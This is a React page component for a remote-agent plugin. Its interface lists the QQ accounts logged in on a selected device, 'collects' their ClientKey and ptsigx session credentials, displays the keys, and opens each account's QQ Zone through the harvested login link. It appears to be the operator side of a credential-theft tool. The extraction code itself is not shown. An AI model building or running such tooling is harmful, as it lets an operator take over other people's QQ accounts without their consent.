import { useCallback, useEffect, useRef, useState } from 'react';
import { Button, Card, Chip, Spinner } from '@heroui/react';
import { usePluginHost } from '../../hooks/usePluginHost';

interface QQAccount {
  uin: string;
  nickname: string;
  clientkey?: string;
  ptsigx?: string;
}

interface QQKeyResult {
  accounts?: QQAccount[];
  error?: string;
}

/** QQ 头像（qlogo 支持 https，避免 https 页面出现 mixed-content 拦截）。 */
function avatarUrl(uin: string): string {
  return `https://q2.qlogo.cn/headimg_dl?dst_uin=${uin}&spec=100`;
}

/** 探测本机 QQ ClientKey。 */
export default function QQKeyPage() {
  const { selectedAgent, dispatchTask } = usePluginHost();
  const [running, setRunning] = useState(false);
  const [result, setResult] = useState<QQKeyResult | null>(null);
  const [err, setErr] = useState<string | null>(null);
  const autoRanAgentRef = useRef<string | null>(null);

  // 轻量加载：只拉 QQ 列表（uin + nickname，不取 clientkey）。
  const fetchList = useCallback(async () => {
    if (!selectedAgent) return;
    setErr(null);
    try {
      const res = await dispatchTask('com.libra.qqkey', 'list', {});
      setResult(res.result as QQKeyResult);
    } catch (e) {
      setErr(e instanceof Error ? e.message : '加载失败');
    }
  }, [selectedAgent, dispatchTask]);

  // 打开页面自动加载列表；切换设备后自动重新加载。
  useEffect(() => {
    if (selectedAgent && autoRanAgentRef.current !== selectedAgent.id) {
      autoRanAgentRef.current = selectedAgent.id;
      fetchList();
    }
  }, [selectedAgent, fetchList]);

  // 手动采集 ClientKey（完整兑换，含 ptsigx）。
  const collect = async () => {
    if (!selectedAgent) return;
    setRunning(true);
    setErr(null);
    try {
      const res = await dispatchTask('com.libra.qqkey', 'collect', {});
      setResult(res.result as QQKeyResult);
    } catch (e) {
      setErr(e instanceof Error ? e.message : '采集失败');
    } finally {
      setRunning(false);
    }
  };

  const openQzone = (ptsigx: string) => {
    if (ptsigx) {
      window.open(ptsigx, '_blank', 'noopener,noreferrer');
    }
  };

  const accounts = result?.accounts ?? [];

  return (
    <div className="space-y-4">
      <Card className="p-6">
        <h1 className="text-xl font-semibold">探测本机 QQ ClientKey</h1>
        <div className="mt-4 flex items-center gap-3">
          <Button variant="primary" isPending={running} isDisabled={!selectedAgent} onPress={collect}>
            采集 ClientKey
          </Button>
          {!selectedAgent && <Chip size="sm" color="warning">请先在顶部选择设备</Chip>}
        </div>
      </Card>

      {err && <Card className="p-4 border border-danger"><p className="text-danger text-sm">{err}</p></Card>}

      {running && (
        <div className="flex items-center gap-2 text-default-500"><Spinner size="sm" /> 采集与兑换中…</div>
      )}

      {result && (
        <Card className="p-4">
          <div className="flex items-center gap-2 mb-3">
            <h2 className="font-semibold">已登录 QQ</h2>
            <Chip size="sm" variant="secondary">{accounts.length} 个</Chip>
          </div>

          {result.error ? (
            <p className="text-sm text-default-500">{result.error}</p>
          ) : accounts.length === 0 ? (
            <p className="text-sm text-default-500">未发现已登录 QQ（本机可能未运行 QQ 或未登录）。</p>
          ) : (
            <div className="space-y-2">
              {accounts.map((acc, i) => (
                <div key={`${acc.uin}-${i}`} className="flex items-center gap-3 rounded-lg border border-default-100 p-3">
                  <img
                    src={avatarUrl(acc.uin)}
                    alt={acc.nickname || acc.uin}
                    className="size-10 shrink-0 rounded-full object-cover bg-default-100"
                    onError={(e) => { (e.target as HTMLImageElement).style.visibility = 'hidden'; }}
                  />
                  <div className="min-w-0 flex-1">
                    <div className="flex items-center gap-2">
                      <span className="font-semibold truncate">{acc.nickname || '未知昵称'}</span>
                      <span className="font-mono text-xs text-default-500">{acc.uin}</span>
                    </div>
                    <div className="mt-0.5 font-mono text-xs break-all">
                      {acc.clientkey ? (
                        <span className="text-default-700">{acc.clientkey}</span>
                      ) : (
                        <span className="text-default-400">未采集 ClientKey（点击「采集 ClientKey」）</span>
                      )}
                    </div>
                  </div>
                  <Button
                    variant="primary"
                    size="sm"
                    isDisabled={!acc.ptsigx}
                    onPress={() => openQzone(acc.ptsigx ?? '')}
                  >
                    打开 QQ 空间
                  </Button>
                </div>
              ))}
            </div>
          )}
        </Card>
      )}
    </div>
  );
}